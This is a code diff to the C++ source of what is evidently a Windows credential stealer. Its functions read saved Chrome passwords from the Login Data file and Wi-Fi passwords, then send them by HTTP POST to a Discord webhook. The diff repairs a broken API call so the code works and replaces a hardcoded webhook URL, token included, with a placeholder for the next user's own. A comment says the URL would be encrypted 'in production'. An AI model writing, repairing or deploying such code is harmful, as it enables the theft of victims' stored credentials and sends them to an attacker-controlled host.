@@ -134,7 +134,7 @@ std::string scan_browser_passwords() {
     ss << "[BROWSER PASSWORDS]\n";
 
     char localappdata[MAX_PATH];
-    ExpandEnvironmentVariableA("%LOCALAPPDATA%", localappdata, sizeof(localappdata));
+    ExpandEnvironmentStringsA("%LOCALAPPDATA%", localappdata, sizeof(localappdata));
 
     std::vector<std::string> paths = {
         std::string(localappdata) + "\\Google\\Chrome\\User Data\\Default\\Login Data",
@@ -182,7 +182,7 @@ std::string scan_wifi_passwords() {
 
 void send_to_webhook(const std::string& content) {
     // Webhook URL (plaintext for testing; would be encrypted in production)
-    const char* webhook = "https://discord.com/api/webhooks/1562127067217137827/ZGHSIVN5HeKCqziDQ_SkgMzhhqwdXGNZDXScjuVHi6qTU8bC0vTvo_PXdw63_B09zZw4";
+    const char* webhook = "https://discord.com/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK";
 
     HINTERNET session = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
     if (!session) return;
@@ -192,7 +192,7 @@ void send_to_webhook(const std::string& content) {
     
     if (connection) {
         HINTERNET request = HttpOpenRequestA(connection, "POST", 
-            "https://discord.com/api/webhooks/1562127067217137827/ZGHSIVN5HeKCqziDQ_SkgMzhhqwdXGNZDXScjuVHi6qTU8bC0vTvo_PXdw63_B09zZw4", "HTTP/1.1", nullptr, nullptr, 
+            "/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK", "HTTP/1.1", nullptr, nullptr, 
             INTERNET_FLAG_SECURE, 0);
         
         if (request) {
